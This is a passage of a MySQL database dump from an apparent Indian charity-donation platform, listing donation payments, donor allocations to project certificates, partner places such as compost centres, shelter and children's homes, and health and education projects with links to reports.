(310, '2012-10-18', 'Online', NULL, NULL, '21000', NULL),
(311, '2012-10-22', 'Online', '', '0000-00-00', '1008', ''),
(312, '2012-10-29', 'Online', '', '0000-00-00', '5000', ''),
(313, '2012-11-01', 'Online', '', '0000-00-00', '2500', ''),
(314, '2012-11-01', 'Online', '', '0000-00-00', '5000', ''),
(315, '2012-11-01', 'Online', '', '0000-00-00', '15000', ''),
(316, '2012-11-02', 'Online', '', '0000-00-00', '2000', ''),
(317, '2012-11-02', 'Cheque', '116130', '2012-10-10', '20000', 'HSBC'),
(322, '2012-11-09', 'Online', NULL, NULL, '12000', NULL),
(319, '2012-10-28', 'Cash Deposit', '', '0000-00-00', '3514', ''),
(320, '2012-10-28', 'Cash Deposit', '', '0000-00-00', '2861', ''),
(321, '2012-10-07', 'Cash Deposit', '', '0000-00-00', '1424', 'Seva Mela'),
(323, '2012-11-15', 'Cheque', NULL, NULL, '65000', 'SBI'),
(324, '2012-11-20', 'Online', NULL, NULL, '50000', NULL),
(325, '2012-11-21', 'Online', NULL, NULL, '1008', NULL),
(326, '2012-12-03', 'Online', NULL, NULL, '5000', NULL),
(327, '2012-12-03', 'Online', NULL, NULL, '2000', NULL),
(328, '2012-12-03', 'Online', NULL, NULL, '2500', NULL),
(329, '2012-12-10', 'Bank Deposit', NULL, NULL, '10000', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `places`
--

CREATE TABLE IF NOT EXISTS `places` (
  `place_id` int(11) NOT NULL AUTO_INCREMENT,
  `place_type` varchar(50) NOT NULL,
  `place_description` varchar(50) NOT NULL,
  `location` varchar(100) NOT NULL,
  `city` varchar(100) NOT NULL,
  `latitude` decimal(10,6) NOT NULL,
  `longitude` decimal(10,6) NOT NULL,
  `organisation` varchar(100) NOT NULL,
  PRIMARY KEY (`place_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=27 ;

--
-- Dumping data for table `places`
--

INSERT INTO `places` (`place_id`, `place_type`, `place_description`, `location`, `city`, `latitude`, `longitude`, `organisation`) VALUES
(1, 'Compost Center', 'C Garden', 'Gowlidoddi', 'Hyderabad', '17.430375', '78.323078', 'Government Upper Primary School'),
(2, 'Compost Center', 'C Garden', 'Gachibowli', 'Hyderabad', '17.439854', '78.345858', 'HillRidge Springs'),
(3, 'Compost Center', 'C Garden', 'Lumbini Park', 'Hyderabad', '17.408653', '78.474419', 'Buddha Purnima Project - HMDA'),
(4, 'Compost Center', 'C Garden', 'Mahalaxmi Nagar', 'Indore', '22.759126', '75.917169', 'Residential Colony'),
(5, 'Compost Center', 'C Garden', 'Mahalaxmi Nagar', 'Indore', '22.753170', '75.916911', 'Sun City'),
(6, 'Compost Center', 'C Garden', 'Pipliyahana', 'Indore', '22.700821', '75.911719', 'Kalindi Kunj'),
(7, 'Compost Center', 'C Garden', 'Khajrana', 'Indore', '22.729997', '75.908918', 'Khajrana Ganesh Mandir'),
(8, 'Compost Center', 'C Garden', 'Bypass Road', 'Indore', '22.673095', '75.917577', 'Silver Spring'),
(9, 'Compost Center', 'C Garden', 'Limbodi', 'Indore', '22.671556', '75.891253', 'Shivdham Colony'),
(10, 'Compost Center', 'C Garden', 'Mhow Naka', 'Indore', '22.700772', '75.836440', 'Ranjeet Hanuman Mandir'),
(11, 'Compost Center', 'C Garden', 'NTR Gardens', 'Hyderabad', '17.410636', '78.466386', 'Buddha Purnima Project - HMDA'),
(12, 'Compost Center', 'C Garden', 'Panjagutta', 'Hyderabad', '17.426025', '78.454142', 'YouSee'),
(13, 'Shelter Home', 'Gents Shelter Home', 'RP Road', 'Hyderabad', '17.431670', '78.492969', 'Aman Vedika'),
(14, 'Shelter Home', 'Women Shelter Home', 'Namalgundu', 'Hyderabad', '17.424146', '78.516302', 'Aman Vedika'),
(15, 'Compost Center', 'C Garden', 'Chikkadpally', 'Hyderabad', '17.400424', '78.496569', 'Aurora Degree College'),
(16, 'Children Home', 'Boys Children Home', 'Saidabad', 'Hyderabad', '17.361491', '78.508995', 'Govt Children Home'),
(17, 'Children Home', 'Boys Observation Home', 'Saidabad', 'Hyderabad', '17.361227', '78.509092', 'Govt Children Home'),
(18, 'Children Home', 'Boys Special Home', 'Saidabad', 'Hyderabad', '17.361119', '78.509092', 'Govt Children Home'),
(19, 'Children Home', 'Girls Children, Observation and Special Home', 'Kachiguda', 'Hyderabad', '17.382520', '78.495389', 'Govt Children Home'),
(20, 'Children Home', 'Infant Home - Shishu Vihar', 'Ameerpet', 'Hyderabad', '17.436880', '78.439135', 'Govt Children Home'),
(21, 'Donation Camp', 'Aurora Degree College', 'Chikkadpally', 'Hyderabad', '17.400424', '78.496569', 'Every Month, Last Saturday, 10am to 12pm'),
(22, 'Donation Camp', 'SEVA Office, Kowtha Kalyana Mandap', 'Padmarao Nagar', 'Hyderabad', '17.428059', '78.507249', 'Every Month, Last Saturday, 10am to 12pm'),
(23, 'Donation Camp', 'Aurora''s Business School', 'Panjagutta', 'Hyderabad', '17.423540', '78.453658', 'Every Month, Last Sunday, 10am to 12pm'),
(24, 'Donation Camp', 'Hill Ridge Springs Apartments', 'Gachibowli', 'Hyderabad', '17.441026', '78.345222', 'Every Month, Last Sunday, 10am to 12pm'),
(25, 'Donation Camp', 'Trenset Winz Apartments', 'Gachibowli', 'Hyderabad', '17.421070', '78.346740', 'Every Month, Last Sunday, 10am to 12pm'),
(26, 'Donation Camp', 'Serene County Apartments', 'Gachibowli', 'Hyderabad', '17.432622', '78.362168', 'Every Month, Last Sunday, 10am to 12pm');

-- --------------------------------------------------------

--
-- Table structure for table `postpay_certificates`
--

CREATE TABLE IF NOT EXISTS `postpay_certificates` (
  `postpay_certificate_id` bigint(10) NOT NULL AUTO_INCREMENT,
  `payment_id` varchar(5) COLLATE utf8_bin DEFAULT NULL,
  `certificate_id` varchar(4) COLLATE utf8_bin DEFAULT NULL,
  `donor_id` varchar(4) COLLATE utf8_bin DEFAULT NULL,
  `amount_for_project` decimal(22,0) DEFAULT NULL,
  `amount_for_operations_grant` decimal(22,0) DEFAULT NULL,
  PRIMARY KEY (`postpay_certificate_id`),
  KEY `PAYMENT_ID` (`payment_id`),
  KEY `DONOR_ID` (`donor_id`),
  KEY `CERTIFICATE_ID` (`certificate_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='PostPay Certificates' AUTO_INCREMENT=343 ;

--
-- Dumping data for table `postpay_certificates`
--

INSERT INTO `postpay_certificates` (`postpay_certificate_id`, `payment_id`, `certificate_id`, `donor_id`, `amount_for_project`, `amount_for_operations_grant`) VALUES
(94, '90', '2', '46', '1800', '200'),
(93, '89', '5', '35', '18200', '1800'),
(92, '88', '5', '29', '1350', '150'),
(91, '87', '5', '45', '2700', '300'),
(90, '86', '2', '38', '9100', '900'),
(89, '85', '5', '23', '2700', '300'),
(88, '84', '5', '29', '900', '100'),
(87, '83', '2', '22', '4550', '450'),
(86, '82', '2', '44', '1800', '200'),
(85, '81', '5', '23', '2700', '300'),
(84, '80', '5', '32', '900', '100'),
(83, '79', '2', '30', '4550', '450'),
(82, '78', '5', '29', '900', '100'),
(81, '77', '5', '43', '4550', '450'),
(80, '76', '5', '23', '2700', '300'),
(79, '75', '5', '32', '900', '100'),
(78, '74', '2', '30', '5400', '600'),
(77, '73', '5', '29', '900', '100'),
(76, '72', '2', '30', '4550', '450'),
(75, '71', '5', '23', '2700', '300'),
(74, '70', '2', '42', '11500', '1500'),
(73, '69', '5', '29', '900', '100'),
(72, '68', '5', '32', '900', '100'),
(71, '67', '2', '41', '900', '100'),
(70, '66', '1', '40', '900', '108'),
(69, '65', '10', '39', '9555', '445'),
(68, '64', '5', '23', '2700', '300'),
(67, '63', '10', '32', '900', '100'),
(66, '62', '2', '30', '4550', '450'),
(65, '61', '10', '29', '900', '100'),
(64, '60', '2', '38', '9100', '900'),
(63, '58', '2', '30', '4550', '450'),
(62, '59', '10', '23', '2700', '300'),
(61, '57', '10', '32', '900', '100'),
(60, '56', '10', '29', '900', '100'),
(59, '55', '10', '37', '27000', '3000'),
(58, '55', '9', '37', '17900', '2100'),
(57, '55', '6', '37', '44769', '5231'),
(56, '54', '9', '36', '450', '50'),
(55, '53', '9', '29', '900', '100'),
(54, '52', '9', '35', '900', '100'),
(53, '51', '6', '30', '4370', '630'),
(52, '50', '8', '23', '2905', '95'),
(51, '49', '8', '32', '900', '100'),
(50, '48', '9', '34', '18200', '1800'),
(49, '47', '9', '25', '4550', '450'),
(48, '46', '6', '30', '4622', '378'),
(47, '45', '8', '23', '2700', '300'),
(46, '44', '8', '29', '900', '100'),
(45, '43', '8', '32', '900', '100'),
(44, '42', '8', '33', '9100', '900'),
(43, '41', '8', '25', '3150', '350'),
(42, '40', '8', '29', '900', '100'),
(41, '39', '8', '23', '2700', '300'),
(40, '38', '6', '30', '4397', '603'),
(39, '37', '4', '32', '900', '100'),
(38, '36', '4', '31', '900', '100'),
(37, '35', '7', '23', '2970', '30'),
(36, '34', '7', '25', '1400', '100'),
(33, '31', '5', '28', '450', '50'),
(34, '32', '7', '29', '950', '50'),
(35, '33', '5', '30', '4550', '450'),
(32, '30', '5', '27', '450', '50'),
(31, '29', '8', '26', '4550', '450'),
(30, '28', '5', '25', '2999', '250'),
(29, '27', '5', '24', '2950', '250'),
(28, '26', '5', '23', '2760', '250'),
(27, '25', '5', '22', '4550', '450'),
(26, '24', '5', '21', '4550', '450'),
(25, '23', '5', '20', '4550', '450'),
(24, '22', '6', '19', '4755', '450'),
(23, '21', '10', '18', '36500', '3500'),
(22, '20', '9', '8', '2099', '200'),
(21, '19', '6', '17', '4332', '268'),
(20, '18', '8', '16', '9100', '900'),
(19, '17', '7', '15', '23000', '2000'),
(18, '16', '7', '14', '4550', '450'),
(17, '15', '6', '13', '4494', '506'),
(16, '14', '7', '12', '3650', '350'),
(15, '13', '7', '11', '1850', '150'),
(14, '12', '7', '10', '3651', '350'),
(13, '11', '7', '9', '4550', '450'),
(12, '10', '7', '8', '2297', '250'),
(11, '9', '8', '7', '2450', '250'),
(10, '9', '6', '7', '4781', '450'),
(9, '8', '8', '3', '4550', '450'),
(8, '7', '7', '6', '9100', '900'),
(7, '6', '7', '3', '4550', '450'),
(6, '5', '7', '5', '2756', '250'),
(5, '5', '6', '5', '4044', '450'),
(4, '4', '6', '4', '4715', '500'),
(3, '3', '6', '3', '2905', '250'),
(2, '2', '6', '2', '2950', '250'),
(1, '1', '6', '1', '20435', '1940'),
(98, '94', '3', '47', '3600', '411'),
(99, '95', '5', '48', '9100', '900'),
(95, '91', '2', '32', '900', '100'),
(96, '92', '2', '30', '3500', '500'),
(97, '93', '2', '23', '2516', '484'),
(100, '96', '3', '29', '1350', '150'),
(101, '97', '3', '30', '4550', '450'),
(102, '98', '5', '49', '1800', '200'),
(103, '99', '5', '32', '900', '100'),
(104, '100', '3', '23', '2700', '300'),
(105, '101', '5', '50', '2700', '300'),
(106, '102', '5', '51', '900', '100'),
(107, '103', '1', '52', '2700', '300'),
(108, '104', '5', '57', '4550', '450'),
(109, '105', '3', '58', '900', '108'),
(110, '106', '3', '58', '11000', '1000'),
(111, '107', '5', '29', '1350', '150'),
(112, '108', '3', '59', '1800', '200'),
(113, '109', '5', '32', '900', '100'),
(114, '110', '3', '30', '4550', '450'),
(115, '111', '3', '58', '900', '108'),
(116, '112', '5', '23', '2700', '300'),
(117, '113', '5', '29', '1350', '150'),
(118, '114', '5', '32', '900', '100'),
(119, '115', '3', '60', '4550', '450'),
(120, '116', '5', '23', '2700', '300'),
(121, '117', '3', '58', '900', '108'),
(122, '118', '5', '29', '1350', '150'),
(124, '120', '5', '32', '900', '100'),
(123, '119', '3', '60', '4550', '450'),
(125, '121', '3', '30', '9100', '900'),
(126, '122', '5', '61', '9100', '900'),
(127, '123', '5', '62', '3600', '400'),
(128, '124', '13', '63', '2644', '250'),
(145, '125', '13', '64', '208', '0'),
(146, '126', '13', '65', '148', '0'),
(129, '127', '3', '58', '900', '108'),
(132, '128', '3', '60', '4550', '450'),
(130, '129', '5', '29', '1350', '150'),
(131, '130', '5', '32', '900', '100'),
(133, '131', '5', '66', '4050', '450'),
(135, '132', '14', '67', '9985', '1000'),
(136, '133', '14', '68', '7702', '850'),
(137, '134', '14', '64', '1803', '225'),
(138, '135', '14', '69', '356', '50'),
(139, '136', '14', '70', '519', '50'),
(140, '137', '14', '71', '2880', '200'),
(141, '138', '14', '72', '1418', '100'),
(142, '139', '14', '73', '6916', '750'),
(143, '140', '14', '65', '470', '0'),
(144, '141', '14', '63', '219', '0'),
(147, '142', '3', '58', '900', '108'),
(148, '143', '3', '30', '7200', '800'),
(149, '144', '5', '74', '900', '100'),
(150, '145', '5', '29', '1350', '150'),
(151, '146', '3', '60', '4550', '450'),
(152, '147', '3', '30', '4550', '450'),
(153, '148', '5', '32', '900', '100'),
(155, '149', '5', '23', '2700', '300'),
(156, '150', '3', '58', '900', '108'),
(157, '151', '5', '29', '1350', '150'),
(158, '152', '3', '60', '4550', '450'),
(159, '153', '5', '32', '900', '100'),
(160, '154', '16', '63', '4802', '500'),
(161, '155', '16', '75', '4020', '450'),
(162, '156', '16', '73', '5393', '550'),
(163, '157', '16', '67', '3790', '400'),
(164, '158', '16', '68', '3090', '300'),
(165, '159', '16', '71', '800', '100'),
(166, '160', '3', '16', '26455', '3745'),
(167, '161', '5', '23', '2700', '300'),
(168, '162', '15', '58', '900', '108'),
(169, '163', '15', '30', '4550', '450'),
(170, '164', '11', '1', '24000', '0'),
(171, '164', '5', '1', '9000', '1000'),
(172, '164', '4', '1', '9000', '1000'),
(173, '164', '12', '1', '9000', '1000'),
(174, '165', '16', '67', '3439', '350'),
(154, '166', '17', '76', '2700', '300'),
(175, '167', '5', '29', '1350', '150'),
(176, '168', '5', '32', '900', '100'),
(177, '169', '15', '60', '4550', '450'),
(178, '170', '15', '30', '4550', '450'),
(179, '171', '5', '77', '4550', '450'),
(180, '172', '5', '23', '2700', '300'),
(181, '173', '5', '31', '1800', '200'),
(182, '174', '5', '45', '3600', '400'),
(134, '175', '18', '87', '4550', '450'),
(185, '176', '15', '58', '900', '108'),
(186, '177', '15', '60', '4550', '450'),
(187, '178', '5', '77', '4550', '450'),
(188, '179', '5', '32', '900', '100'),
(189, '180', '16', '73', '4607', '500'),
(190, '181', '16', '67', '3473', '350'),
(191, '182', '16', '68', '1164', '100'),
(192, '183', '16', '88', '600', '100'),
(193, '184', '15', '30', '4550', '450'),
(194, '185', '4', '29', '1350', '150'),
(195, '186', '4', '103', '90000', '10000'),
(199, '187', '16', '107', '4550', '450'),
(196, '188', '4', '31', '1800', '200'),
(197, '189', '4', '23', '2700', '300'),
(198, '190', '15', '58', '900', '108'),
(200, '191', '17', '24', '1800', '200'),
(201, '192', '15', '30', '4550', '450'),
(202, '193', '4', '32', '900', '100'),
(203, '194', '4', '77', '4550', '450'),
(204, '195', '17', '24', '1800', '200'),
(205, '196', '4', '108', '4550', '450'),
(184, '197', '19', '6', '9000', '1000'),
(206, '198', '5', '23', '2700', '300'),
(207, '199', '21', '58', '900', '108'),
(208, '200', '16', '67', '4550', '450'),
(209, '201', '16', '67', '2759', '300'),
(210, '202', '16', '67', '1805', '200'),
(211, '203', '20', '73', '920', '100'),
(212, '204', '20', '73', '3981', '400'),
(213, '205', '18', '88', '919', '100'),
(214, '206', '18', '88', '882', '100'),
(215, '207', '18', '68', '2120', '200'),
(216, '208', '18', '72', '919', '100'),
(217, '209', '18', '72', '399', '0'),
(218, '210', '18', '64', '280', '0'),
(219, '211', '18', '63', '1078', '100'),
(220, '212', '18', '138', '320', '0'),
(221, '213', '18', '109', '110', '0'),
(222, '214', '5', '32', '900', '100'),
(223, '215', '15', '60', '4550', '450'),
(224, '216', '18', '77', '4550', '450'),
(225, '217', '21', '30', '2700', '300'),
(226, '218', '1', '86', '900', '100'),
(227, '219', '17', '24', '1800', '200'),
(228, '220', '5', '23', '2700', '300'),
(229, '221', '21', '58', '900', '108'),
(230, '222', '5', '35', '18000', '2000'),
(231, '223', '15', '60', '4550', '450'),
(232, '224', '22', '24', '1800', '200'),
(233, '225', '5', '32', '900', '100'),
(234, '226', '22', '77', '4550', '450'),
(235, '227', '5', '29', '4550', '450'),
(236, '228', '18', '148', '10999', '1'),
(237, '229', '5', '149', '450', '50'),
(238, '230', '5', '150', '450', '50'),
(239, '231', '21', '30', '5400', '600'),
(240, '232', '21', '58', '900', '108'),
(241, '233', '21', '61', '9000', '1000'),
(242, '234', '22', '87', '9000', '1000'),
(243, '235', '5', '155', '450', '50'),
(244, '236', '22', '156', '200', '0'),
(245, '237', '4', '162', '420', '0'),
(246, '238', '4', '153', '150', '0'),
(247, '239', '15', '60', '5000', '0'),
(248, '240', '4', '32', '2000', '0'),
(249, '241', '17', '24', '2000', '0'),
(250, '242', '17', '77', '5000', '0'),
(251, '243', '21', '163', '6000', '0'),
(252, '244', '24', '31', '2000', '0'),
(253, '245', '23', '63', '1252', '0'),
(254, '246', '23', '68', '3300', '0'),
(255, '247', '23', '73', '7905', '0'),
(256, '248', '23', '88', '1274', '0'),
(257, '249', '23', '72', '1372', '0'),
(258, '250', '23', '67', '3658', '0'),
(259, '251', '23', '75', '2500', '0'),
(260, '252', '23', '154', '350', '0'),
(261, '253', '23', '67', '3979', '0'),
(262, '254', '17', '68', '1811', '0'),
(263, '255', '17', '29', '1500', '0'),
(264, '256', '21', '30', '3000', '0'),
(265, '257', '5', '51', '1000', '0'),
(266, '258', '24', '165', '1008', '0'),
(267, '259', '21', '58', '1008', '0'),
(268, '260', '23', '73', '3066', '0'),
(269, '261', '16', '88', '627', '0'),
(270, '262', '4', '29', '1500', '0'),
(271, '263', '4', '32', '2000', '0'),
(272, '264', '15', '60', '5000', '0'),
(273, '265', '17', '24', '2000', '0'),
(274, '266', '17', '77', '5000', '0'),
(275, '267', '23', '167', '4220', '0'),
(276, '268', '17', '43', '10000', '0'),
(277, '269', '19', '166', '100000', '0'),
(278, '270', '1', '293', '5000', '0'),
(279, '271', '21', '30', '3000', '0'),
(280, '272', '21', '58', '1008', '0'),
(281, '273', '23', '294', '1000', '0'),
(282, '274', '17', '24', '2000', '0'),
(283, '275', '4', '32', '2000', '0'),
(284, '276', '17', '77', '5000', '0'),
(285, '277', '21', '30', '5000', '0'),
(286, '278', '4', '295', '3920', '0'),
(287, '278', '4', '153', '230', '0'),
(288, '278', '4', '150', '350', '0'),
(289, '279', '23', '67', '3800', '0'),
(290, '280', '23', '68', '4050', '0'),
(291, '281', '23', '67', '4400', '0'),
(292, '282', '23', '73', '2550', '0'),
(293, '283', '23', '88', '1347', '0'),
(294, '284', '22', '303', '1000', '0'),
(295, '285', '17', '302', '215', '0'),
(296, '285', '5', '302', '200', '0'),
(297, '286', '21', '58', '1008', '0'),
(298, '287', '23', '304', '2500', '0'),
(299, '288', '16', '378', '1000', '0'),
(300, '289', '23', '32', '2000', '0'),
(301, '290', '22', '77', '5000', '0'),
(302, '291', '22', '24', '2500', '0'),
(303, '292', '23', '108', '8500', '0'),
(304, '293', '21', '58', '1008', '0'),
(305, '294', '23', '73', '2347', '0'),
(306, '295', '23', '72', '1085', '0'),
(307, '296', '23', '88', '2255', '0'),
(308, '297', '23', '67', '5070', '0'),
(309, '298', '28', '43', '15000', '0'),
(310, '299', '21', '379', '5000', '0'),
(311, '299', '12', '379', '5000', '0'),
(312, '300', '22', '77', '5000', '0'),
(313, '301', '28', '380', '25000', '0'),
(314, '302', '12', '32', '2000', '0'),
(315, '303', '22', '24', '2500', '0'),
(316, '304', '12', '295', '980', '0'),
(317, '304', '12', '162', '1050', '0'),
(318, '305', '22', '76', '3000', '0'),
(319, '306', '28', '73', '3975', '0'),
(320, '307', '28', '72', '1391', '0'),
(321, '308', '28', '88', '2377', '0'),
(322, '309', '21', '30', '6000', '0'),
(323, '310', '28', '381', '21000', '0'),
(324, '311', '21', '58', '1008', '0'),
(325, '312', '28', '57', '5000', '0'),
(326, '313', '22', '24', '2500', '0'),
(327, '314', '25', '77', '5000', '0'),
(328, '315', '28', '43', '15000', '0'),
(329, '316', '22', '32', '2000', '0'),
(330, '317', '19', '382', '10000', '0'),
(331, '317', '25', '382', '10000', '0'),
(332, '319', '28', '73', '3514', '0'),
(333, '320', '28', '88', '2861', '0'),
(334, '321', '28', '138', '1424', '0'),
(335, '322', '28', '383', '12000', '0'),
(336, '323', '28', '397', '65000', '0'),
(337, '324', '28', '35', '50000', '0'),
(338, '325', '21', '58', '1008', '0'),
(339, '326', '29', '77', '5000', '0'),
(340, '327', '27', '32', '2000', '0'),
(341, '328', '25', '24', '2500', '0'),
(342, '329', '29', '398', '10000', '0');

-- --------------------------------------------------------

--
-- Table structure for table `projects`
--

CREATE TABLE IF NOT EXISTS `projects` (
  `project_id` int(3) NOT NULL AUTO_INCREMENT,
  `project_title` varchar(200) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
  `project_description` varchar(500) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
  `location` varchar(100) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
  `latitude` decimal(10,6) NOT NULL,
  `longitude` decimal(10,6) NOT NULL,
  `project_area` varchar(100) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
  `project_status` varchar(10) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`project_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=16 ;

--
-- Dumping data for table `projects`
--

INSERT INTO `projects` (`project_id`, `project_title`, `project_description`, `location`, `latitude`, `longitude`, `project_area`, `project_status`) VALUES
(1, 'Health Clinics', 'OutPatients Health Camps for poor communities in Kancheepuram District and Chennai', 'Tamil Nadu', '10.500000', '78.460000', 'Health', NULL),
(2, 'Integrated Development Project for RagPickers', 'Primary Education, Vocational Training and Financial Inclusion for Low Income households like RagPickers and Community Waste Management', 'Indore', '22.430000', '75.500000', 'Education, Health, Environment & Livelihoods', 'Active'),
(3, 'Education for Girl Children', 'Education for 300 underprivileged girl children', 'Bhubaneswar', '20.140000', '85.500000', 'Education', 'Active'),
(4, 'Mobile Health Clinics', 'Mobile Health Clinic services for poor communities, including deployment of IT solutions for the Mobile Clinic', 'Tamil Nadu', '10.500000', '78.460000', 'Health', 'Active'),
(5, 'Benefits for RagPickers', 'Providing livelihood support assets for RagPickers', 'Hyderabad', '17.223100', '78.282700', 'Environment & Livelihoods', NULL),
(6, 'Education for hearing impaired Children', 'Education for Hearing Impaired Children', 'Hyderabad', '17.223100', '78.282700', 'Education', 'Active'),
(7, 'Donate Your Waste', 'Community driven waste reduction and waste donation initiative', 'Hyderabad, Indore', '0.000000', '0.000000', 'Environment', 'Active'),
(8, 'Education for underprivileged Children', 'Education and Life skill Development for Children from Underserved Communities', 'Hyderabad', '17.223100', '78.282700', 'Education', 'Active'),
(9, 'Vocational Training for underprivileged Women', 'Vocational Training for underprivileged Women', 'Guwahati', '26.000000', '91.750000', 'Education  & Livelihoods', 'Active'),
(10, 'Support for Paediatric Care in ICH Govt Hospital', 'Paediatric Care in ICH Government Hospital', 'Chennai', '13.000000', '80.150000', 'Health', 'Active'),
(11, 'Supporting Government School to Enhance Learning Environment', 'Supporting Government School to Enhance Learning Environment', 'Hyderabad', '17.223100', '78.282700', 'Education', 'Active'),
(12, 'Supporting Public Health System at Gandhi Hospital', 'Supporting Public Health System at Gandhi Hospital', 'Hyderabad', '17.423537', '78.504181', 'Health', 'Active'),
(13, 'Supporting Public Health System at Institute of Preventive Medicine', 'Supporting Public Health System at Institute of Preventive Medicine', 'Hyderabad', '17.393723', '78.490070', 'Health', 'Active'),
(14, 'Education for underprivileged Children', 'Supporting underprivileged Schools to Enhance Learning Environment', 'Delhi', '28.413144', '28.413144', 'Education', 'Active'),
(15, 'Tele-Helpline for Career Counselling support for Students', 'Tele-Helpline for Career Counselling support for Students', 'Hyderabad', '17.459075', '78.366311', 'Education', 'Active');

-- --------------------------------------------------------

--
-- Table structure for table `project_certificates`
--

CREATE TABLE IF NOT EXISTS `project_certificates` (
  `certificate_id` int(4) NOT NULL AUTO_INCREMENT,
  `project_id` varchar(3) COLLATE utf8_bin DEFAULT NULL,
  `value` decimal(22,0) DEFAULT NULL,
  `title` varchar(200) COLLATE utf8_bin DEFAULT NULL,
  `description` varchar(500) COLLATE utf8_bin DEFAULT NULL,
  `area` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `tags` varchar(200) COLLATE utf8_bin DEFAULT NULL,
  `town_city` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `district` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `state` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `partner_id` varchar(3) COLLATE utf8_bin DEFAULT NULL,
  `start_date` date DEFAULT NULL,
  `completion_date` date DEFAULT NULL,
  `project_photo` blob,
  `document` longtext COLLATE utf8_bin,
  `document_link` varchar(200) COLLATE utf8_bin DEFAULT NULL,
  `project_photo_link` varchar(200) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`certificate_id`),
  KEY `PARTNER_ID` (`partner_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Project Certificates' AUTO_INCREMENT=30 ;

--
-- Dumping data for table `project_certificates`
--

INSERT INTO `project_certificates` (`certificate_id`, `project_id`, `value`, `title`, `description`, `area`, `tags`, `town_city`, `district`, `state`, `partner_id`, `start_date`, `completion_date`, `project_photo`, `document`, `document_link`, `project_photo_link`) VALUES
(7, '2', '65274', 'Completing a baseline survey of Rag Picking Community in 3 slums of Indore, for obtaining indicators on Education, Health and Livelihoods, to assist in design of program for improving these indicators', '', 'Integrated', 'Education, Health, Environment', 'Indore', 'Indore', 'Madhya Pradesh', '1', '2009-08-07', '2009-08-31', NULL, NULL, 'http://www.yousee.in/images/UC-PC-RagPickers_project.pdf', 'https://lh6.googleusercontent.com/_wAuKZKGVdSo/Tce3ruOkaFI/AAAAAAAAACo/XnojgqEhsJ8/s512/ragpicker.jpg'),
(6, '1', '111569', '2,848 OutPatients attended at 3 Health Camps for poor communities in Kancheepuram District and Chennai, through the Shree Sai Healing Trust', NULL, 'Health', NULL, 'Chennai', 'Chennai', 'Tamil Nadu', '4', '2009-07-15', '2009-09-30', NULL, NULL, 'http://www.yousee.in/images/UC-PC-OutPatient_clinics.pdf', 'https://lh3.googleusercontent.com/_wAuKZKGVdSo/TceuiHLv7bI/AAAAAAAAACM/mwL1DknCua8/s640/dr%20investigating.JPG'),
(5, '2', '197959', 'Providing Primary Education and Financial Inclusion for RagPicking community in 2 Slums of Indore and investments for scaling up a Waste Recycling plant', NULL, 'Integrated', 'Education, Health,  Environment', 'Indore', 'Indore', 'Madhya Pradesh', '1', '2010-02-01', '2010-03-31', NULL, NULL, 'http://www.yousee.in/images/UC-RC_RagPickersProjectPhase4-Feb-Mar2010.pdf', 'https://lh4.googleusercontent.com/_wAuKZKGVdSo/TcecMjUWwVI/AAAAAAAAABw/D3CzOVlRfbA/s640/crc%20class.JPG'),
(4, '2', '178156', 'Providing Primary Education and Financial Inclusion for RagPicking community in 2 Slums of Indore and investments for scaling up a Waste Recycling plant', NULL, 'Integrated', 'Education, Health,  Environment', 'Indore', 'Indore', 'Madhya Pradesh', '1', '2010-04-01', '2010-04-30', NULL, NULL, 'http://www.yousee.in/images/UC-RC-RagPickers_Project-Apr2010.pdf', 'https://lh4.googleusercontent.com/_wAuKZKGVdSo/Tcea799R6WI/AAAAAAAAABo/mFmpcPqqpeg/s640/e-learning.JPG'),
(1, '3', '12000', 'IT education for 303 Girl Children at a School run by Palli Unnayan Seva Samiti near Bhuwaneshwar for the poor', NULL, 'Education', NULL, 'Bhubaneswar', 'Khurda', 'Orissa', '3', '2010-08-01', '2010-09-30', NULL, NULL, 'http://www.yousee.in/images/UC-RC-PUSS.pdf', 'https://lh4.googleusercontent.com/_wAuKZKGVdSo/TceZR7GlZsI/AAAAAAAAABc/lIspHs0YHDg/s640/assembly.jpg'),
(2, '4', '69266', 'Providing Mobile Health Clinic Services for 2,327 OutPatient visits in Slum of Chennai through Isha Outreach', NULL, 'Health', NULL, 'Chennai', 'Chennai', 'Tamil Nadu', '2', '2010-10-01', '2010-10-31', NULL, NULL, 'http://www.yousee.in/images/UC-RC-Isha_Outreach_Oct2010.pdf', 'https://lh4.googleusercontent.com/_wAuKZKGVdSo/TceV99x5kXI/AAAAAAAAAA0/GZPCmkYJ6J8/s640/Patients%20waiting%20thier%20turn%20at%20clinic.JPG'),
(3, '4', '105005', 'Providing Mobile Health Clinic Services for 3,904 Out Patient visits in Slum of Chennai through Isha Outreach', NULL, 'Health', NULL, 'Chennai', 'Chennai', 'Tamil Nadu', '2', '2010-11-01', '2010-12-31', NULL, NULL, 'http://www.yousee.in/images/UC-RC-Isha_Outreach_Nov-Dec_2010.pdf', 'https://lh3.googleusercontent.com/_wAuKZKGVdSo/TceWxvu1PlI/AAAAAAAAABE/zxn3tjM1bTM/s640/patient%20data%20being%20directly%20captured%20in%20laptop.jpg'),
(8, '2', '44805', 'Providing Primary Education and Financial Inclusion for RagPicking community in 2 slums of Indore', NULL, 'Integrated', 'Education, Health,  Environment', 'Indore', 'Indore', 'Madhya Pradesh', '1', '2009-10-01', '2009-11-30', NULL, NULL, 'http://www.yousee.in/images/UC-PC-RagPickers_project-Indore-Phase2.pdf', 'https://lh3.googleusercontent.com/_wAuKZKGVdSo/Tce3AIjPqYI/AAAAAAAAACk/pYAf4NO-T1Q/s640/group%20meeting.JPG'),
